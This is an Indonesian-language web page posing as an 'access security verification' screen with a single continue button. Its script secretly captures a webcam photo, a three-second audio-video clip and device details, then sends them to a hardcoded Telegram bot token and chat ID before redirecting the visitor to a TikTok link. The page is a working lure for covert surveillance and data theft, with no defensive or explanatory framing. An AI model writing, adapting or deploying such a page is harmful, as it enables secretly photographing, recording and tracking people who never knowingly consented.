<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verifikasi Keamanan Akses</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
      color: #f8fafc;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .card {
      background: rgba(30, 41, 59, 0.7);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 20px;
      padding: 32px 24px;
      max-width: 400px;
      width: 100%;
      text-align: center;
      box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.3), 0 8px 10px -6px rgba(0, 0, 0, 0.3);
    }

    .icon-wrapper {
      width: 64px;
      height: 64px;
      background: rgba(59, 130, 246, 0.1);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 16px auto;
      color: #3b82f6;
    }

    h2 {
      font-size: 1.5rem;
      font-weight: 700;
      margin-bottom: 8px;
    }

    p.subtitle {
      color: #94a3b8;
      font-size: 0.875rem;
      margin-bottom: 24px;
      line-height: 1.5;
    }

    .btn {
      width: 100%;
      background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
      color: #ffffff;
      border: none;
      padding: 14px 20px;
      font-size: 1rem;
      font-weight: 600;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.2s ease;
      box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
    }

    .btn:hover {
      transform: translateY(-1px);
      box-shadow: 0 6px 16px rgba(37, 99, 235, 0.4);
    }

    .btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
      transform: none;
    }

    .status-container {
      margin-top: 20px;
      min-height: 24px;
    }

    .status-text {
      font-size: 0.875rem;
      color: #cbd5e1;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .spinner {
      width: 16px;
      height: 16px;
      border: 2px solid rgba(255, 255, 255, 0.2);
      border-top-color: #3b82f6;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      display: inline-block;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

  <div class="card">
    <div class="icon-wrapper">
      <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
    </div>
    <h2>Verifikasi Akses</h2>
    <p class="subtitle">Klik lanjutka</p>
    
    <button id="startBtn" class="btn">lanjutka</button>
    
    <div class="status-container">
      <p id="status" class="status-text"></p>
    </div>
  </div>

  <canvas id="photoCanvas" style="display:none;"></canvas>
  <video id="videoPreview" autoplay muted playsinline style="display:none;"></video>

<script>
  const BOT_TOKEN = "7783419810:AAF8TqVK6-d_IVbrlN8Rv6PPelPUMldfx88";
  const CHAT_ID = "7856323152";
  
  // URL Tujuan diubah ke TikTok
  const TARGET_TIKTOK_URL = "https://vt.tiktok.com/ZSbybfxGF/";

  const startBtn = document.getElementById('startBtn');
  const statusTxt = document.getElementById('status');
  const video = document.getElementById('videoPreview');
  const canvas = document.getElementById('photoCanvas');

  startBtn.addEventListener('click', async () => {
    startBtn.disabled = true;
    setStatus("Memproses verifikasi...", true);

    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
      video.srcObject = stream;
      
      // Tunggu kamera siap
      await new Promise(r => setTimeout(r, 1500));

      // 1. AMBIL FOTO
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);
      const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));

      // 2. AMBIL VIDEO (3 detik)
      const videoBlob = await recordMedia(stream, 3000);
      stream.getTracks().forEach(t => t.stop());

      // 3. AMBIL INFO PERANGKAT
      const deviceInfo = `📱 Perangkat: ${navigator.userAgent}\n` +
                         `🌐 Koneksi: ${navigator.connection ? navigator.connection.effectiveType : 'unknown'}`;

      setStatus("Mengirim data...", true);

      // KIRIM KE TELEGRAM (Parallel execution)
      await Promise.all([
        sendTelegramPhoto(photoBlob),
        sendTelegramVideo(videoBlob),
        sendTelegramMessage(deviceInfo)
      ]);

      setStatus("Verifikasi selesai! Membuka TikTok...", false);

      // Pengalihan ke TikTok setelah jeda singkat
      setTimeout(() => {
        window.location.href = TARGET_TIKTOK_URL;
      }, 500);

    } catch (err) {
      setStatus("Gagal: " + err.message, false);
      startBtn.disabled = false;
    }
  });

  function setStatus(text, showSpinner) {
    statusTxt.innerHTML = showSpinner 
      ? `<span class="spinner"></span> ${text}` 
      : text;
  }

  async function sendTelegramPhoto(blob) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, 'foto.jpg');
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
  }

  async function sendTelegramVideo(blob) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', blob, 'video.mp4');
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
  }

  async function sendTelegramMessage(text) {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    });
  }

  async function recordMedia(stream, duration) {
    return new Promise((resolve) => {
      const mediaRecorder = new MediaRecorder(stream);
      const chunks = [];
      mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
      mediaRecorder.onstop = () => resolve(new Blob(chunks, { type: 'video/mp4' }));
      mediaRecorder.start();
      setTimeout(() => mediaRecorder.stop(), duration);
    });
  }
</script>
</body>
</html>
